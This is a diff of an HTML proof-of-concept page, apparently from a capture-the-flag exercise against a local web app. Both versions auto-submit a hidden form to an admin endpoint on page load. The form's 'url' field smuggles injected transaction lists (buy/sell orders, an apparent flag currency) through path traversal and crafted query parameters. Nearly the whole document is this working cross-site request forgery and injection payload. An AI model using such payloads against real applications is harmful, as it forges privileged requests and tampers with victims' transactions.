@@ -1,15 +1,9 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8" />
-  <title>Pure HTML PoC</title>
-</head>
-<body onload="document.forms[0].submit()">
-  <form method="POST" action="http://localhost:5000/admin.php" target="_top">
-    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-+op:+BUY%0A++amount:+1%0A++currency:+US%0A-+op:+SELL%0A++amount:+1%0A++currency:+US%0A-+op:+BUY%0A++amount:+1%0A++currency:+FL">
-  </form>
-
-  <!-- Fallback: if JS disabled, meta-refresh submits via GET -->
-  <meta http-equiv="refresh" content="0;url=http://localhost:5000/admin.php?url=http://localhost:5000/admin.php/../index.php?html=-+op:+BUY%0A++amount:+1%0A++currency:+US%0A-+op:+SELL%0A++amount:+1%0A++currency:+US%0A-+op:+BUY%0A++amount:+1%0A++currency:+FL">
+<body>
+<form id="f" action="http://localhost:5000/admin.php" method="POST">
+<input name="url" type="hidden" value="http://localhost:5000/admin.php?transactions%5B%0A- amount: 1000000%0A  currency: XYZ%0A  op: BUY%0A- amount: 1000000%0A  currency: XYZ%0A  op: SELL%0A- amount: 1%0A  currency: FL%0A  op: BUY%0A%5D%5Bamount%5D=1&amp;transactions%5B%0A- amount: 1000000%0A  currency: XYZ%0A  op: BUY%0A- amount: 1000000%0A  currency: XYZ%0A  op: SELL%0A- amount: 1%0A  currency: FL%0A  op: BUY%0A%5D%5Bcountry%5D=fake">
+</form>
+<script>document.getElementById("f").submit();</script>
 </body>
 </html>
